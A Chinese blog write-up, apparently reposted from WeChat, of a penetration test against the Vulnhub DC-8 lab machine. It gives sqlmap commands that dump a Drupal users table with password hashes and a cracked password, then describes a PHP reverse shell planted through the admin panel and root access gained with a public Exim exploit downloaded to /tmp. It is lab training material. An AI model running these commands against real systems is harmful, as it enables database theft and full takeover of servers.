> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/Zc4PtihNMrGgCUmOti_lhg)

说明：Vulnhub 是一个渗透测试实战网站，提供了许多带有漏洞的渗透测试靶机下载。适合初学者学习，实践。DC-8 是本系列最后一幕，全程只有一个 falg，获取 root 权限，以下内容是自身复现的过程，总结记录下来，如有不足请多多指教。

下载地址：

Download: http://www.five86.com/downloads/DC-8.zip

  
目标机 IP 地址：192.168.5.143  
攻击机 kali IP 地址：192.168.5.135

arp-scan -l 进行主机查找。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa25v8hM6vwZakEosw1o2Q1f2yEBNicRM489ls8fRJRMFx5bCoBOVISnlzax717ptvQz5G8biaGv0X9icg/640?wx_fmt=png)

nmap -sS -sV -p- 192.168.5.143  端口扫描。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa25v8hM6vwZakEosw1o2Q1f2IRZy8cGFp4NWJ5rLBkibc2ISh1Ys1icxf4q759flialEIM803WyTvFhwg/640?wx_fmt=png)

与 DC-7 一样后台同样使用了 Drupal CMS。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa25v8hM6vwZakEosw1o2Q1f2oBech8icGux4ZibpO0BVMZ58erqBo3Crf9HHgHAFIGXIW0Mhiaj48O2Jg/640?wx_fmt=png)

web 版本详情。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa25v8hM6vwZakEosw1o2Q1f2h6zLTiaRAdB975JSPIovKaOzjfjxu5rGXcOWr2MZKVvwtSvtLvCOX2A/640?wx_fmt=png)

目录爆破发现：

http://192.168.5.143/robots.txt，访问页面中提示了一些路径。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa26a5Lx81JTuicnZaN1u5ZE3xTg6PiabUXzsjoibEYugU0CNRVNXqbibASqo89u3BHeiaksIKWCe2AuBPpQ/640?wx_fmt=png)

发现注入点，点击 Details。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa26a5Lx81JTuicnZaN1u5ZE3xSdn9KwLMZ2WQGgx4ciaWN7TwpyV8If8sC2U7RIaIgxwt2ibfVpb6dWjQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa26a5Lx81JTuicnZaN1u5ZE3xHxgaOFL7Sx5FDZt2mrTODtzleXdia1WQmxI2Bu9W4YPWHdfmB9aWreQ/640?wx_fmt=png)

数字型注入，sqlmap 跑一波。爆出数据库。

```
sqlmap -u "http://192.168.5.143/?nid=1" --dbs
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa26a5Lx81JTuicnZaN1u5ZE3xBra7jczrCJDvYuCe9CG0MTUmkwxaHJIyoQg4vS6fnX8Jz0BvVUSyhA/640?wx_fmt=png)

查看 d7db 数据库的所有的表，然后看一下 users 表中的所有字段。

```
sqlmap -u "http://192.168.5.143/?nid=1" -D d7db --tables
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa26a5Lx81JTuicnZaN1u5ZE3x7w4iaX7C939ej3RRX2JjqmZQicIPZxYwApdt0uhzOUXaz7w22Iqibbia7g/640?wx_fmt=png)

```
sqlmap -u "http://192.168.5.143/?nid=1" -D "d7db"  -T "users" --columns
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa26a5Lx81JTuicnZaN1u5ZE3xC6sQefzRT6ibJ3y1tp3cRPsA7Vpc6hv2nrbnDPNUBhPBMVT85fQBVPw/640?wx_fmt=png)  

查看 name 字段与 pass 字段，获取用户与密码。

admin/$S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z

john/$S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF

```
sqlmap -u "http://192.168.5.143/?nid=1" -D "d7db"  -T "users" -C  "name,pass" --dump
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa26a5Lx81JTuicnZaN1u5ZE3xY4IlGKX9pPseavjR8nReBpYAQoibJtLQsDnrYVr1TAZq9LlQ2YbLkDA/640?wx_fmt=png)

将 admin，john 以及他们加密的密码分别进行保存，使用 john 工具进行解密。

john/turtle

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa26a5Lx81JTuicnZaN1u5ZE3xp3qQv4ow2a4vbfWNC7dJYtGMtbXjWXfYIWviawMTeNcTgTkubdfiadAw/640?wx_fmt=png)

访问登陆页面登陆后台。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa26a5Lx81JTuicnZaN1u5ZE3xwIO1GFS9UrromfDyo3sh1ycZUrSy4LBUjNydQ5ts9tnB6tpSibpjCbg/640?wx_fmt=png)

进入后台后，根据 DC7 的渗透流程，可能会存在插入 php 代码的地方。不出所料如图所示。  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa26a5Lx81JTuicnZaN1u5ZE3xMiaIMRwjU3nQtGqXCjPeLJ3CyRL4LDazAV3l2bLLMkJPvaO1cryAAicQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa26a5Lx81JTuicnZaN1u5ZE3xftdACVLhbCuDM2WWYF7U1klDqsOgCRFE3OGPAwDHPgXbMfJ482aD4w/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa26a5Lx81JTuicnZaN1u5ZE3x9F3SGKOe8Y0VqNTkB0fXvMEfpicXOukF0BrGRwAGkLKhtGB6eQuuwPg/640?wx_fmt=png)

编辑好设置信息后发邮件才可触发。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa26a5Lx81JTuicnZaN1u5ZE3xDq4c0eVHzEoRVrB0hmsEfX3BHuMScBpx3IwzyXnL2n3vUFicrbZuChQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa26a5Lx81JTuicnZaN1u5ZE3xdJkibsdQtib3IoaZa48WUTkXxgqPEJt2C4xqKPglNlhDfNMbkUTMRBpA/640?wx_fmt=png)

我们直接反弹 shell。本地监听 7777。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa26a5Lx81JTuicnZaN1u5ZE3xkfibreRAb3KuLwSm00k8xdGNDCZib0gSlyZibzjcbm1icKxcmlF96AiasSA/640?wx_fmt=png)

有个坑.... 在此处，先写上任意字符，然后在写 php 代码才行，还有就是上来不要着急编辑，先设置好 Text format 。  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa26a5Lx81JTuicnZaN1u5ZE3xE5mG1mNKbibMBBREwQpqezH3BPxw9yicG016heAZzY34ibjZgpqJjDKlw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa26a5Lx81JTuicnZaN1u5ZE3xOULcaBAO6ZbqJJhTSLGIu7d2oB4Z3bgFfFYc34UQb3EibJqIzzzjR4g/640?wx_fmt=png)

切换交互式 shell。

```
python -c 'import pty;pty.spawn("/bin/bash")'
```

查找符合权限的文件。  

```
find / -perm -u=s -type f 2>/tmp/null
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa26a5Lx81JTuicnZaN1u5ZE3xCeX4ibpibI3O3rqxXH7oUXBWMg1gDC040z7TJH0lI5TiaPwFgicbD07Q9A/640?wx_fmt=png)

发现 exim4 是可以用来提权的。  

searchsploit  exim 一下，查看可以利用的漏洞。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa26a5Lx81JTuicnZaN1u5ZE3xicQA2I6tgbfwx3KjPjMOwjpjdhrKOKd0YtrNbEj0XAA6WUb7RmEKYPA/640?wx_fmt=png)  

查看了一下版本信息，对照漏洞表选择利用方式。  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa26a5Lx81JTuicnZaN1u5ZE3x1epm0h8dpzm5UfXkBWhaLSibL64QezibwHvXvkGdePCk5w3O0YTjib0qw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa26a5Lx81JTuicnZaN1u5ZE3x7zhQiby6FguYOSrtzHmrSckXZlbcYfxroxBM9GJQq8WOEoDahl5GB0g/640?wx_fmt=png)

该脚本有两种利用规则，分别为：Usage (setuid method) 、Usage (netcat method) 详情参照该链接。

```
https://www.exploit-db.com/exploits/46996
```

将脚本: set ff=unix 一下然后保存，脚本改名为 dc8.sh 上传到攻击机中。根据脚本中的使用方式，进行提权。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa26a5Lx81JTuicnZaN1u5ZE3xGMeT9q7ibLhkCSRTzn37wUqrrLoSbvvlicjaDqyFXsfIKKIdFAPaV1LQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa26a5Lx81JTuicnZaN1u5ZE3xYtOKhuibUCkEjUJphWicqOibayKUSN9m2GHq0kaDAqqiaWHcxmoZQgia6XA/640?wx_fmt=png)

tmp 可任意读写，将文件下载到 tmp 下执行。  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa26a5Lx81JTuicnZaN1u5ZE3xiawo440daTDv9B1MklMJTTVXjficVRD3z2Q0BjU88tfpo1icthueRCbTg/640?wx_fmt=png)

开启 Apache，攻击者直接将脚本下载到 tmp 下。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa26a5Lx81JTuicnZaN1u5ZE3xH4kCicWmzUqRACA8Dibh101a7qo0E2Gd5efVHRBzHmzp8ibEkedicJUv4A/640?wx_fmt=png)

./dc8.sh -m netcat 提权成功。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa26a5Lx81JTuicnZaN1u5ZE3xhyIwPdK9trWMaA7HNoNrjgcjOBFI9nkxRlIN2puy7icz2pBJfMF8PMw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa26a5Lx81JTuicnZaN1u5ZE3x4icnxLzoNN5ns5VE3F46NsJsENCKBBscAJzc5lic1vDUHg5okgQNI0qA/640?wx_fmt=png)

DC 系列将要告一段落，但是学习的道路永无止境。句号既是结束，又是起笔的开始，享受过程，充实人生。

我从来没有长大, 但我从来没有停止过成长 

                                                                               ——阿瑟 · 克拉克

免责声明：本站提供安全工具、程序 (方法) 可能带有攻击性，仅供安全研究与教学之用，风险自负!  

转载声明：著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。

订阅查看更多复现文章、学习笔记

thelostworld

安全路上，与你并肩前行！！！！

![](https://mmbiz.qpic.cn/mmbiz_jpg/uljkOgZGRjeUdNIfB9qQKpwD7fiaNJ6JdXjenGicKJg8tqrSjxK5iaFtCVM8TKIUtr7BoePtkHDicUSsYzuicZHt9icw/640?wx_fmt=jpeg)

个人知乎：https://www.zhihu.com/people/fu-wei-43-69/columns

个人简书：https://www.jianshu.com/u/bf0e38a8d400

个人 CSDN：https://blog.csdn.net/qq_37602797/category_10169006.html

个人博客园：https://www.cnblogs.com/thelostworld/

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcW6VR2xoE3js2J4uFMbFUKgglmlkCgua98XibptoPLesmlclJyJYpwmWIDIViaJWux8zOPFn01sONw/640?wx_fmt=png)

欢迎添加本公众号作者微信交流，添加时备注一下 “公众号”  

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcSQn373grjydSAvWcmAgI3ibf9GUyuOCzpVJBq6z1Z60vzBjlEWLAu4gD9Lk4S57BcEiaGOibJfoXicQ/640?wx_fmt=png)